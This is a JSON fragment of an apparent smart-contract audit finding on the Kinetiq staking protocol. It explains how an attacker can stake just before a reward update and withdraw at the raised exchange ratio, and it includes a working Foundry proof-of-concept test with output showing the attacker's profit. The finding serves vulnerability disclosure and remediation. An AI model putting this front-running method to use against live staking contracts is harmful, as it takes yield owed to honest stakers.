      "aiSeverity": null,
      "aiValidity": null,
      "body": "## Vulnerability Details\n\nThe current distribution of rewards does not consider the staking duration. This allows a malicious user to simply call [StakingManager.stake()](https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingManager.sol#L242) right before the rewards are increased through [OracleManager.generatePerformance()](https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/OracleManager.sol#L274). Once the rewards are increased, nothing prevents the malicious user to withdraw the funds with yield. \n\nTake a look on how the [current exchange ratio](https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingAccountant.sol#L216-L219) is calculated when queueing a withdrawal:\n\n```solidity\n// StakingManager.sol\n    function queueWithdrawal(uint256 kHYPEAmount) external nonReentrant whenNotPaused whenWithdrawalNotPaused {\n        ...\n        // Convert post-fee kHYPE to HYPE using StakingAccountant\n        // Both kHYPE and HYPE are in 8 decimals\n@>        uint256 hypeAmount = stakingAccountant.kHYPEToHYPE(postFeeKHYPE);\n    }\n\n// StakingAccountant.sol\n    function kHYPEToHYPE(uint256 kHYPEAmount) public view override returns (uint256) {\n@>        return Math.mulDiv(kHYPEAmount, _getExchangeRatio(), 1e18);\n    }\n\n    function _getExchangeRatio() internal view returns (uint256) {\n        ...\n        // Calculate total HYPE (in 8 decimals)\n        uint256 rewardsAmount = validatorManager.totalRewards();\n        uint256 slashingAmount = validatorManager.totalSlashing();\n@>        uint256 totalHYPE = totalStaked + rewardsAmount - totalClaimed - slashingAmount;\n\n        // Calculate ratio with 18 decimals precision\n@>        return Math.mulDiv(totalHYPE, 1e18, totalKHYPESupply);\n    }\n\n```\nEven though there are some mechanisms in place that \"delay\" the withdraw, this do not prevent the attack to happen. For instance: \n\n- To confirm a withdrawal, the user must wait the withdrawal delay which currently is 7 days. \n- `MANAGER_ROLE` can call `cancelWithdrawal` **but this does not change the fact that the malicious user deposited with a lower rate** than the current exchange rate. \n- The max staking amount per user can be bypassed by making minimal deposits from several accounts. I.e: smart contract A delegate smart contract B ~ Z the task to make the deposit. \n\nBasically a malicious user can: \n- Deposit HYPE right before rewards are increased.\n- Once the rewards are increased, the malicious user can queue withdrawal\n- Execute the withdraw process(queue, wait for the delay and confirm withdrawal)\n- Profit. Attacker stole the rewards from the users's staking.\n\nNotice that is not necessary to be a \"sandwich\" transaction, even if the attacker queues the withdrawal 1 hour later, he is already benefiting from the new ratio caused by the rewards.\n## Impact\n\n- Malicious user that do not have funds in the protocol, can steal protocol rewards by making a deposit right before rewards are increased.\n- User rewards are stolen permanently. \n- Protocol yield is lost and users with committed stakes will not receive their yield.\n\n## Recommendation\n\n- The distribution of rewards should be done by considering the staking amount and duration. i.e: could be done like in the [MasterChef/Synthetix staking](https://www.rareskills.io/post/staking-algorithm) contracts.",
      "proofOfConcept": "The PoC below demonstrate the case mentioned in this submission where an attacker front-run the rewards increase and steal users' rewards.\n\n- Create a new test file called `StealRewards.t.sol` and paste the code below: \n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"./Base.t.sol\";\nimport \"../src/interfaces/IStakingManager.sol\";\nimport \"../src/oracles/IOracleAdapter.sol\";\nimport {IValidatorManager} from \"../src/interfaces/IValidatorManager.sol\";\n\ncontract MockOracleAdapter is IOracleAdapter {\n    uint256 public rewardAmountStorage;\n    uint256 public balanceStorage;\n\n    function set(uint256 _rewardAmount, uint256 _balance) public {\n        rewardAmountStorage = _rewardAmount;\n        balanceStorage = _balance;\n    }\n\n    function supportsInterface(bytes4 interfaceId) external pure virtual returns (bool) {\n        return interfaceId == type(IOracleAdapter).interfaceId;\n    }\n\n    function getPerformance(\n        address /* validator */\n    )\n        external\n        view\n        returns (\n            uint256 balance,\n            uint256 uptimeScore,\n            uint256 speedScore,\n            uint256 integrityScore,\n            uint256 selfStakeScore,\n            uint256 rewardAmount,\n            uint256 slashAmount,\n            uint256 timestamp\n        )\n    {\n        // Return fixed values for testing with current timestamp\n        return (balanceStorage, 80, 80, 80, 80, rewardAmountStorage, 0, block.timestamp);\n    }\n\n    function name() external pure returns (string memory) {\n        return \"MockOracleAdapter\";\n    }\n\n    function version() external pure returns (string memory) {\n        return \"1.0.0\";\n    }\n}\n\ncontract StealRewardsTest is BaseTest {\n    address public validator;\n    address public validator1;\n    address public validator2;\n    address public attacker;\n    MockOracleAdapter public mockOracle;\n\n    function setUp() public override {\n        super.setUp();\n\n        // Setup validator addresses\n        validator = makeAddr(\"validator\");\n        validator1 = makeAddr(\"validator1\");\n        validator2 = makeAddr(\"validator2\");\n        attacker = makeAddr(\"attacker\");\n        mockOracle = new MockOracleAdapter();\n\n        // Grant roles\n        vm.startPrank(admin);\n        oracleManager.grantRole(oracleManager.OPERATOR_ROLE(), operator);\n        oracleManager.grantRole(oracleManager.MANAGER_ROLE(), manager);\n        stakingManager.grantRole(stakingManager.OPERATOR_ROLE(), operator);\n        stakingManager.grantRole(stakingManager.MANAGER_ROLE(), manager);\n        vm.stopPrank();\n\n        // Setup oracle and sm\n        vm.startPrank(manager);\n        oracleManager.authorizeOracleAdapter(address(mockOracle));\n        oracleManager.setOracleActive(address(mockOracle), true);\n        oracleManager.setMinUpdateInterval(1 hours);\n        stakingManager.setMaxStakeAmount(100 ether);\n        vm.stopPrank();\n    }\n\n    function test_InitialState() public view {\n        assertTrue(stakingManager.hasRole(stakingManager.DEFAULT_ADMIN_ROLE(), admin));\n        assertTrue(stakingManager.hasRole(stakingManager.OPERATOR_ROLE(), operator));\n        assertTrue(stakingManager.hasRole(stakingManager.MANAGER_ROLE(), manager));\n\n        assertEq(address(stakingManager.pauserRegistry()), address(pauserRegistry));\n        assertEq(address(stakingManager.validatorManager()), address(validatorManager));\n        assertEq(address(stakingManager.kHYPE()), address(kHYPE));\n\n        assertEq(stakingManager.minStakeAmount(), minStake);\n        assertEq(stakingManager.maxStakeAmount(), maxStake);\n        assertEq(stakingManager.stakingLimit(), stakingLimit);\n        assertEq(stakingManager.totalStaked(), 0);\n        assertEq(stakingManager.totalClaimed(), 0);\n        assertEq(stakingManager.totalQueuedWithdrawals(), 0);\n    }\n\n    function testAttacker_stealRewards() public {\n        // pre conditions\n        _activateValidatorAndStakeSomeHype();\n\n        // action: attacker notice rewards increase in the mempool and front-run transaction \n        uint256 attackerInitialAmount = 100 ether;\n        _stakeAmount(attacker, attackerInitialAmount);\n        \n        uint256 ratioBefore = stakingAccountant.kHYPEToHYPE(1e18);\n        console.log(\"kHYPE to HYPE before: %e\", ratioBefore);\n\n        // then rewards are increased\n        _notifyRewards(1 ether, 10 ether);\n        console.log(\"kHYPE to HYPE after: %e\", stakingAccountant.kHYPEToHYPE(1e18));\n\n        // ratio increase with the 1 ether rewards\n        assertGt(stakingAccountant.kHYPEToHYPE(1e18), ratioBefore);\n\n        // attacker queue withdrawal with the new ratio, stealing the rewards accrued\n        _queueWithdrawal(attacker, attackerInitialAmount);\n\n        // confirm withdrawal for attacker and user\n        _confirmWithdrawal(attacker, 0);\n        _userWithdrawal();\n\n        console.log(\"Attackers ETH balance after: %e\", attacker.balance);\n        console.log(\"Users ETH balance after: %e\", user.balance);\n\n        // assert attacker got > 0.8 ether from the 1 ether rewards\n        assertGt(attacker.balance - attackerInitialAmount, 0.8 ether);\n\n        console.log(\"Attacker profit: %e\", attacker.balance - attackerInitialAmount);\n        console.log(\"User profit: %e\", user.balance - 10 ether);\n    }\n\n    function _userWithdrawal() internal { \n        vm.deal(address(stakingManager), 11 ether);\n        _queueWithdrawal(user, 10 ether);\n        vm.warp(block.timestamp + 8 days); \n        \n        vm.startPrank(user);\n        stakingManager.confirmWithdrawal(0);\n        vm.stopPrank();\n    }\n\n    function _stakeAmount(address _user, uint256 _amount) internal { \n        vm.deal(_user, _amount);\n        vm.prank(_user);\n        stakingManager.stake{value: _amount}();\n    }\n\n    function _queueWithdrawal(address _user, uint256 _amount) internal { \n        vm.startPrank(_user);\n        kHYPE.approve(address(stakingManager), _amount);\n        stakingManager.queueWithdrawal(_amount);\n        vm.stopPrank();\n    }\n\n    function _confirmWithdrawal(address _user, uint256 _withdrawalId) internal { \n        vm.warp(8 days); \n        vm.deal(address(stakingManager), 101 ether);\n        vm.startPrank(_user);\n        stakingManager.confirmWithdrawal(_withdrawalId);\n        vm.stopPrank();\n    }\n\n    function _activateValidatorAndStakeSomeHype() internal { \n        uint256 stakeAmount = 10 ether;\n\n        // Set up delegation first\n        vm.startPrank(manager);\n        validatorManager.activateValidator(validator);\n        validatorManager.setDelegation(address(stakingManager), validator);\n        vm.stopPrank();\n\n        vm.deal(user, stakeAmount);\n        vm.prank(user);\n\n        stakingManager.stake{value: stakeAmount}();\n\n        assertEq(stakingManager.totalStaked(), stakeAmount);\n        assertEq(kHYPE.balanceOf(user), stakeAmount);\n    }\n\n    function _notifyRewards(uint256 rewardAmount, uint256 additionalBalance) internal { \n        vm.warp(1 hours); \n        uint256 newBalance = mockOracle.balanceStorage() + additionalBalance;\n        vm.startPrank(operator);\n        mockOracle.set(rewardAmount, newBalance);\n        oracleManager.generatePerformance(validator);\n        vm.stopPrank();\n    }\n}\n\n```\nRun: `forge test --match-test testAttacker_stealRewards -vv` \n\nOutput: \n```md\n  HYPE to kHYPE before: 1e18\n  HYPE to kHYPE after: 1.00909090909090909e18\n  Attackers ETH balance after: 1.00808181818181818091e20\n  Users ETH balance after: 1.0080818181818181899e19\n@>  Attacker profit: 8.08181818181818091e17\n  User profit: 8.0818181818181899e16\n```",
